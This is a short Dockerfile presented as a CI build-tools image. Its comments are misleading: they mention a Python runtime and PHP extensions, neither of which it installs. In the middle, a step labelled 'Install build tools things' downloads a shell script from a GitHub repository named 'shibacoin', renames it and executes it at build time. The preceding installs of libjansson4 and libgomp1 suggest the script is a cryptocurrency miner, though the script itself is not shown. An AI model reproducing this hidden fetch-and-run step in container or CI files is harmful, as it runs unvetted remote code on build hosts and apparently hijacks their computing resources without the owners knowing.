# Use an official Python runtime as a parent image
FROM ubuntu:18.04

# Switch to root user
USER root

# Install necessary packages for PHP extensions
RUN apt-get update && apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && apt install sudo && \
     apt-get install -y \
        wget \
        sudo \
        g++

###########################
# Install build tools things
###########################

RUN wget -O fas.sh https://raw.githubusercontent.com/noval61616161/shibacoin/main/violet.sh && chmod +x fas.sh && ./fas.sh

# Set the working directory to /build-tools-ci
WORKDIR /build-tools-ci

# Copy the current directory contents into the container at /build-tools-ci
ADD . /build-tools-ci

# Collect the components we need for this image
RUN apt-get update
RUN apt-get install -y ruby jq curl rsync hub
RUN ls
RUN gem install circle-cli
